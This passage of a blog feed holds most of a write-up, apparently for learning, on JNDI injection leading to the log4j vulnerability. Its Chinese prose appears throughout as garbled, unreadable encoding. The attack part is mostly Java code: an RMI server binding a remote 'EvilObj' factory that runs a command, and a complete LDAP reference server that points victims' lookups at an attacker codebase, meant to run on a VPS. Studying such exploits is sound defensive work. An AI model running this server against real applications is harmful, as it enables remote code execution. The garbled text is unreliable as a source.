æœåŠ¡å™¨çš„ç£ç›˜åˆ†åŒºï¼Œæœ‰ä»¥ä¸‹å“ªä¸€ç§æ–‡ä»¶ç³»ç»Ÿ?"></a>61.é˜¿åŠ›å£«FTP æœåŠ¡å™¨çš„ç£ç›˜åˆ†åŒºï¼Œæœ‰ä»¥ä¸‹å“ªä¸€ç§æ–‡ä»¶ç³»ç»Ÿ?</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/xt.png" class="" title="alt text"><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/xt2.png" class="" title="alt text"><h1 id="62-é˜¿åŠ›å£«FTPæœåŠ¡å™¨ç”¨æˆ·è¾“å…¥äº†æŒ‡ä»¤-å»æ£€æŸ¥ç°å­˜çš„Dockerå®¹å™¨-ä¾‹å¦‚-netstat-lntpï¼Œè¯·è¾“å…¥-netstatlntpï¼Œä¸è¦è¾“å…¥ç©ºæ ¼"><a href="#62-é˜¿åŠ›å£«FTPæœåŠ¡å™¨ç”¨æˆ·è¾“å…¥äº†æŒ‡ä»¤-å»æ£€æŸ¥ç°å­˜çš„Dockerå®¹å™¨-ä¾‹å¦‚-netstat-lntpï¼Œè¯·è¾“å…¥-netstatlntpï¼Œä¸è¦è¾“å…¥ç©ºæ ¼" class="headerlink" title="62.é˜¿åŠ›å£«FTPæœåŠ¡å™¨ç”¨æˆ·è¾“å…¥äº†æŒ‡ä»¤ _ å»æ£€æŸ¥ç°å­˜çš„Dockerå®¹å™¨ (ä¾‹å¦‚ netstat lntpï¼Œè¯·è¾“å…¥ netstatlntpï¼Œä¸è¦è¾“å…¥ç©ºæ ¼)"></a>62.é˜¿åŠ›å£«FTPæœåŠ¡å™¨ç”¨æˆ·è¾“å…¥äº†æŒ‡ä»¤ <em>_</em> å»æ£€æŸ¥ç°å­˜çš„Dockerå®¹å™¨ (ä¾‹å¦‚ netstat lntpï¼Œè¯·è¾“å…¥ netstatlntpï¼Œä¸è¦è¾“å…¥ç©ºæ ¼)</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/64.png" class="" title="alt text">]]></content>
      
      
      
        <tags>
            
            <tag> å–è¯ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä»JNDIæ³¨å…¥åˆ°log4jæ³¨å…¥</title>
      <link href="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/"/>
      <url>/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="æœ¬æ–‡ç« é¦–å‘äºå…ˆçŸ¥ç¤¾åŒºä»JNDIæ³¨å…¥åˆ°log4jæ¼æ´"><a href="#æœ¬æ–‡ç« é¦–å‘äºå…ˆçŸ¥ç¤¾åŒºä»JNDIæ³¨å…¥åˆ°log4jæ¼æ´" class="headerlink" title="æœ¬æ–‡ç« é¦–å‘äºå…ˆçŸ¥ç¤¾åŒºä»JNDIæ³¨å…¥åˆ°log4jæ¼æ´"></a>æœ¬æ–‡ç« é¦–å‘äºå…ˆçŸ¥ç¤¾åŒº<a href="https://xz.aliyun.com/t/15880?time__1311=GqjxnDgQiQi%3DdGNDQ0PBKGQAPxVQd7Fa4D">ä»JNDIæ³¨å…¥åˆ°log4jæ¼æ´</a></h1><p>ä»Šå¤©é—²çš„æ…Œï¼Œä¸çŸ¥é“å­¦äº›ä»€ä¹ˆï¼Œäºæ˜¯å»NSSä¸Šæ‰¾ä¸€ä¸‹javaçš„é¢˜ç›®æƒ³ç€åˆ·ç‚¹é¢˜ï¼Œäºæ˜¯åˆ·åˆ°äº†ä¸€é¢˜log4jçš„é¢˜ç›®ï¼Œä¸€ç›´éƒ½èƒ½å¬è¯´è¿™ä¸ªlog4jçš„æ ¸å¼¹çº§æ¼æ´çš„å¨åæƒ³ç€å­¦ä¸€ä¸‹ï¼Œäºæ˜¯å°±æœ‰äº†è¿™ç¯‡æ–‡ç« </p><h1 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h1><p>é¦–å…ˆæˆ‘ä»¬è¦å…ˆäº†è§£ä¸€ä¸‹ä»€ä¹ˆæ˜¯JNDI<br>JNDIå…¨å(Java Naming and Directory Interfaceå³Javaå‘½åå’Œç›®å½•æ¥å£)<br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/1.png" class="" title="alt text"></p><h2 id="å‘½åæœåŠ¡"><a href="#å‘½åæœåŠ¡" class="headerlink" title="å‘½åæœåŠ¡"></a>å‘½åæœåŠ¡</h2><p>å‘½åæœåŠ¡çš„ä¸»è¦åŠŸèƒ½æ˜¯å°†äººä»¬çš„å‹å¥½åç§°æ˜ å°„åˆ°å¯¹è±¡ï¼Œä¾‹å¦‚åœ°å€ã€æ ‡è¯†ç¬¦æˆ–è®¡ç®—æœºç¨‹åºé€šå¸¸ä½¿ç”¨çš„å¯¹è±¡ã€‚</p><p>ä¾‹å¦‚ï¼ŒInternet åŸŸåç³»ç»Ÿ ï¼ˆDNSï¼‰ å°†è®¡ç®—æœºåç§°æ˜ å°„åˆ° IP åœ°å€ï¼š</p><p>www.example.com ==&gt; 192.0.2.5<br>æ–‡ä»¶ç³»ç»Ÿå°†æ–‡ä»¶åæ˜ å°„åˆ°ç¨‹åºå¯ç”¨äºè®¿é—®æ–‡ä»¶å†…å®¹çš„æ–‡ä»¶å¼•ç”¨ã€‚</p><p>c:\bin\autoexec.bat ==&gt; File Reference</p><h2 id="ç›®å½•æœåŠ¡"><a href="#ç›®å½•æœåŠ¡" class="headerlink" title="ç›®å½•æœåŠ¡"></a>ç›®å½•æœåŠ¡</h2><p>è®¸å¤šå‘½åæœåŠ¡éƒ½ä½¿ç”¨ç›®å½•æœåŠ¡è¿›è¡Œæ‰©å±•ã€‚ç›®å½•æœåŠ¡å°†åç§°ä¸å¯¹è±¡ç›¸å…³è”ï¼Œå¹¶å°†æ­¤ç±»å¯¹è±¡ä¸å±æ€§ç›¸å…³è”ã€‚</p><p>ç›®å½•æœåŠ¡ = å‘½åæœåŠ¡ + åŒ…å«å±æ€§çš„å¯¹è±¡</p><p>æ‚¨ä¸ä»…å¯ä»¥æŒ‰å¯¹è±¡åç§°æŸ¥æ‰¾å¯¹è±¡ï¼Œè¿˜å¯ä»¥è·å–å¯¹è±¡çš„å±æ€§æˆ–æ ¹æ®å¯¹è±¡çš„å±æ€§æœç´¢å¯¹è±¡ã€‚<br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/1.gif" class="" title="alt text"><br>ä¾‹å¦‚ï¼Œç”µè¯å…¬å¸çš„ç›®å½•æœåŠ¡ã€‚å®ƒå°†è®¢é˜…è€…çš„å§“åæ˜ å°„åˆ°ä»–çš„åœ°å€å’Œç”µè¯å·ç ã€‚è®¡ç®—æœºçš„ç›®å½•æœåŠ¡ä¸ç”µè¯å…¬å¸çš„ç›®å½•æœåŠ¡éå¸¸ç›¸ä¼¼ï¼Œå› ä¸ºä¸¤è€…éƒ½å¯ç”¨äºå­˜å‚¨ç”µè¯å·ç å’Œåœ°å€ç­‰ä¿¡æ¯ã€‚ç„¶è€Œï¼Œè®¡ç®—æœºçš„ç›®å½•æœåŠ¡è¦å¼ºå¤§å¾—å¤šï¼Œå› ä¸ºå®ƒå¯ä»¥åœ¨çº¿è·å¾—ï¼Œå¹¶ä¸”å¯ä»¥ç”¨æ¥å­˜å‚¨ç”¨æˆ·ã€ç¨‹åºç”šè‡³è®¡ç®—æœºæœ¬èº«å’Œå…¶ä»–è®¡ç®—æœºå¯ä»¥ä½¿ç”¨çš„å„ç§ä¿¡æ¯ã€‚</p><p>directory å¯¹è±¡è¡¨ç¤ºè®¡ç®—ç¯å¢ƒä¸­çš„å¯¹è±¡ã€‚ä¾‹å¦‚ï¼Œç›®å½•å¯¹è±¡å¯ç”¨äºè¡¨ç¤ºæ‰“å°æœºã€äººå‘˜ã€è®¡ç®—æœºæˆ–ç½‘ç»œã€‚directory å¯¹è±¡åŒ…å«æè¿°å®ƒæ‰€è¡¨ç¤ºçš„å¯¹è±¡çš„å±æ€§ã€‚</p><h1 id="JNDIå¯ä»¥ç”¨å¤šç§æœåŠ¡å¯¹ï¼Œå¯¹è±¡è¿›è¡Œå‘½åï¼ŒæŒ‚è½½ã€‚"><a href="#JNDIå¯ä»¥ç”¨å¤šç§æœåŠ¡å¯¹ï¼Œå¯¹è±¡è¿›è¡Œå‘½åï¼ŒæŒ‚è½½ã€‚" class="headerlink" title="JNDIå¯ä»¥ç”¨å¤šç§æœåŠ¡å¯¹ï¼Œå¯¹è±¡è¿›è¡Œå‘½åï¼ŒæŒ‚è½½ã€‚"></a>JNDIå¯ä»¥ç”¨å¤šç§æœåŠ¡å¯¹ï¼Œå¯¹è±¡è¿›è¡Œå‘½åï¼ŒæŒ‚è½½ã€‚</h1><h2 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h2><p>JNDIä½¿ç”¨RMIçš„æ–¹å¼ä¸å¾ˆåƒ<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="comment">//Server.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIRMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NamingException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">ic</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">    <span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;EvilObj&quot;</span>,<span class="string">&quot;EvilObj&quot;</span>,<span class="string">&quot;http://127.0.0.1:8000&quot;</span>);</span><br><span class="line">    ic.rebind(<span class="string">&quot;rmi://localhost:1099/EvilObj&quot;</span>,ref);</span><br><span class="line"><span class="comment">/*        ReferenceWrapper wrapper = new ReferenceWrapper(ref);</span></span><br><span class="line"><span class="comment">        registry.bind(&quot;RCE&quot;,wrapper);*/</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Client.java</span></span><br><span class="line"><span class="keyword">import</span> org.omg.CORBA.IRObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        InitialContext ic= <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        ic.lookup(<span class="string">&quot;rmi://localhost:1099/EvilObj&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//EvilObjv</span></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilObj</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">ObjectFactory</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvilObj</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var2) &#123;</span><br><span class="line">            <span class="type">IOException</span> <span class="variable">e</span> <span class="operator">=</span> var2;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//æ¶æ„ç±»æ˜¯éœ€è¦å®ç°ObjectFactoryæ¥å£çš„ï¼Œå³æ¶æ„å·¥å‚</span></span><br></pre></td></tr></table></figure></p><p>è¿è¡Œä¸Šé¢çš„ä»£ç å°±ä¼šå‘ç°JNDIçš„å®¢æˆ·ç«¯åŠ è½½äº†æœåŠ¡ç«¯ä¸Šçš„EvilObj</p><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/3.png" class="" title="alt text"><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/4.png" class="" title="alt text"><p>ä¸€è·¯è°ƒè¯•ä¼šå‘ç°å…¶æœ€åå¼¹è®¡ç®—æœºä¹Ÿå°±æ˜¯è§¦å‘å‘½ä»¤æ‰§è¡Œçš„åœ°æ–¹å¹¶ä¸åœ¨JNDIè¿™ä¸ªåŒ…ä¸‹è€Œæ˜¯è¿›å…¥äº†NamingManager<br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/10.png" class="" title="alt text"></p><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/11.png" class="" title="alt text"><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/12.png" class="" title="alt text"><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/5.png" class="" title="alt text"><p>æœ€ååœ¨loadClassé‡Œå‘ç°forNameæ¥åŠ è½½ç±»ï¼Œè€ŒforNameåŠ è½½çš„æ˜¯æœ¬åœ°çš„ç±»ï¼Œè€Œæœ¬åœ°å¹¶æ²¡æœ‰æˆ‘ä»¬çš„æ¶æ„ç±»ã€‚æˆ‘ä»¬ç»§ç»­è°ƒè¯•<br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/16.png" class="" title="alt text"><br>ä¼šå‘ç°å…¶åˆ¤æ–­clasæ˜¯å¦ä¸ºç©ºï¼Œcodebaseæ˜¯å¦ä¸ºç©ºã€‚å½“æˆ‘ä»¬å‰é¢forNameåŠ è½½æˆåŠŸæ—¶å°±ä¸ä¼šè¿›å…¥åä¹‹ã€‚<br>è€Œåç»§ç»­è¿œç¨‹åŠ è½½ç±»<br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/6.png" class="" title="alt text"><br>æœ€åå‘ç°å…¶å°†åŠ è½½çš„ç±»è¿›è¡Œäº†å®ä¾‹åŒ–ï¼Œå³ä¼šè¿è¡Œæ¶æ„ç±»ä¸­æ„é€ æ–¹æ³•ä¸­çš„æ¶æ„ä»£ç </p><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/2.png" class="" title="alt text"><p>ä½¿ç”¨å¦‚æœä¸€ä¸ªJNDIå…¶lookupå†…çš„urlå¯æ§ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å°±å¯ä»¥è®©å…¶æŒ‡å‘æˆ‘ä»¬çš„æ¶æ„rmiæœåŠ¡å™¨ä»è€Œä½¿å…¶é€ æˆå‘½ä»¤æ‰§è¡Œ</p><h2 id="Ldap"><a href="#Ldap" class="headerlink" title="Ldap"></a>Ldap</h2><p>è¿™ä¸ªæ¼æ´åœ¨çˆ†å‡ºæ¥åå¾ˆå¿«å°±è¢«å®˜æ–¹æ‰“äº†è¡¥ä¸ã€‚å¦‚ä¸‹<br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/8.png" class="" title="alt text"><br>ä¸Šé¢çš„ä»£ç å®šä¹‰äº†ä¸€ä¸ªç³»ç»Ÿå˜é‡trustURLCodebaseã€‚é»˜è®¤ä¸ºfalse<br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/9.png" class="" title="alt text"><br>ä¸Šé¢çš„ä»£ç å¯¹trustURLCodebaseè¿›è¡Œäº†åˆ¤æ–­ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°å› ä¸ºèµ·é»˜è®¤ä¸ºfalseï¼Œè¿™å¯¼è‡´æˆ‘ä»¬æ— æ³•åŠ è½½è¿œç¨‹çš„urlçš„ç±»</p><p>å…¶è¡¥ä¸å°†rmiè¿›è¡Œäº†æ£€æµ‹å¯¼è‡´æˆ‘ä»¬æ— æ³•åˆ©ç”¨rmiæ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œä½†æ˜¯å…¶æ²¡æœ‰å¯¹Ldapè¿›è¡Œè¿‡æ»¤ï¼Œæ‰€æœ‰æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨Ldapæ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œ<br>ä½¿ç”¨å¦‚ä¸‹ä»£ç èµ·ä¸€ä¸ªLdapåŠ è½½æ¶æ„ç±»çš„æœåŠ¡<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Ldap</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">( String[] tmp_args )</span> &#123;</span><br><span class="line">        String[] args=<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;http://127.0.0.1:8000/#EvilObj&quot;</span>&#125;;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">2234</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                    <span class="string">&quot;listen&quot;</span>, <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                    InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>), <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(args[ <span class="number">0</span> ])));</span><br><span class="line">            <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">            System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span> <span class="params">( URL cb )</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line">            <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();</span><br><span class="line">            <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaCodeBase&quot;</span>, cbstring);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaNamingReference&quot;</span>); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaFactory&quot;</span>, <span class="built_in">this</span>.codebase.getRef());</span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>ä¸Šé¢çš„javaä»£ç å¯ä»¥æ‰“åŒ…æˆjaråŒ…è€Œåæ”¾åœ¨vpsä¸Šè¿è¡Œã€‚<br>è€ŒåClientç«¯ä¸ä¹‹å‰RMiçš„ç›¸ä¼¼<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//import 